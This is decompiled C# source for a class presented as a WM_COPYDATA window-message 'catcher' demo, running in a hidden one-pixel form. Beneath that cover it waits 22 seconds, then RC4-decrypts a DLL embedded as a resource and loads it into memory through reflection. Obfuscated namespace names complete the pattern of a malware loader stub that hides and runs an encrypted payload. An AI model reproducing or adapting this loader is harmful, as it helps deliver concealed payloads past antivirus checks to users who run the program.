using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Sgjnaqgvttlsgispqarhnky;

namespace Kzzdehomtdt;

public class Catcher : Form
{
	public delegate void CopyStringDelegate(string msg);

	public delegate void CopyDataDelegate(CopyData msg);

	private static Catcher mInstance;

	private static TaskCompletionSource<Catcher> onLoad = new TaskCompletionSource<Catcher>();

	public static event CopyStringDelegate StringCopied;

	public static event CopyDataDelegate DataCopied;

	public Catcher()
	{
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Width(1);
		((Control)this).set_Height(1);
	}

	public static void Demo()
	{
		Thread.Sleep(22000);
		AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
		Start().Wait();
		StringCopied += Console.WriteLine;
		DataCopied += delegate(CopyData msg)
		{
			Console.WriteLine("Received " + msg.dwData + ": " + msg.lpData);
		};
		MessagePasser.SendString(GetHandle(), "test");
		MessagePasser.SendString(GetHandle(), 3, "other test");
		while (IsOpen())
		{
			Thread.Sleep(1);
		}
	}

	private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
	{
		MemoryStream memoryStream = new MemoryStream();
		using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Kzzdehomtdt.Sgjnaqgvttlsgispqarhnky.dll"))
		{
			stream.CopyTo(memoryStream);
		}
		if (memoryStream.Length > 0L)
		{
			byte[] array = Decrypt(memoryStream.ToArray());
			return (Assembly)typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { array });
		}
		return null;
	}

	public static Task<Catcher> Start()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ClassLibrary val = new ClassLibrary();
		Thread thread = new Thread(runForm);
		val.Data();
		thread.SetApartmentState(ApartmentState.STA);
		thread.IsBackground = true;
		thread.Start();
		return onLoad.Task;
	}

	internal static byte[] Decrypt(byte[] data)
	{
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[data.Length];
		byte[] bytes = Encoding.UTF8.GetBytes("Zzdxemn");
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = bytes[i % bytes.Length];
			array2[i] = i;
		}
		i = 0;
		int num = 0;
		for (; i < 256; i++)
		{
			num = (num + array2[i] + array[i]) % 256;
			int num2 = array2[i];
			array2[i] = array2[num];
			array2[num] = num2;
		}
		i = 0;
		num = 0;
		int num3 = 0;
		for (; i < data.Length; i++)
		{
			num3++;
			num3 %= 256;
			num += array2[num3];
			num %= 256;
			int num2 = array2[num3];
			array2[num3] = array2[num];
			array2[num] = num2;
			int num4 = array2[(array2[num3] + array2[num]) % 256];
			array3[i] = (byte)(data[i] ^ num4);
		}
		return array3;
	}

	protected override void OnLoad(EventArgs e)
	{
		((Form)this).OnLoad(e);
		onLoad.SetResult(this);
	}

	public static IntPtr GetHandle()
	{
		//IL_002f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Expected O, but got Unknown
		IntPtr val = IntPtr.Zero;
		if (mInstance == null)
		{
			throw new InvalidOperationException("Catcher not started");
		}
		((Control)mInstance).Invoke((Delegate)(MethodInvoker)delegate
		{
			val = ((Control)mInstance).get_Handle();
		});
		return val;
	}

	public static bool IsOpen()
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		bool val = false;
		if (mInstance == null)
		{
			throw new InvalidOperationException("Catcher not started");
		}
		if (!((Control)mInstance).get_IsDisposed() && !((Control)mInstance).get_Disposing())
		{
			try
			{
				((Control)mInstance).Invoke((Delegate)(MethodInvoker)delegate
				{
					val = ((Control)mInstance).get_Visible();
				});
			}
			catch (Exception)
			{
				return false;
			}
			return val;
		}
		return false;
	}

	public static void Stop()
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		if (mInstance == null)
		{
			throw new InvalidOperationException("Catcher not started");
		}
		Catcher.DataCopied = null;
		((Control)mInstance).Invoke((Delegate)new MethodInvoker(mInstance.endForm));
	}

	private static void runForm()
	{
		mInstance = new Catcher();
		Application.Run((Form)(object)mInstance);
	}

	private void endForm()
	{
		((Form)this).Close();
	}

	protected override void WndProc(ref Message m)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		if (((Message)(ref m)).get_Msg() == 74)
		{
			Catcher.DataCopied?.Invoke(MessagePasser.ReceiveData(m));
			Catcher.StringCopied?.Invoke(MessagePasser.ReceiveString(m));
		}
		((Form)this).WndProc(ref m);
	}
}
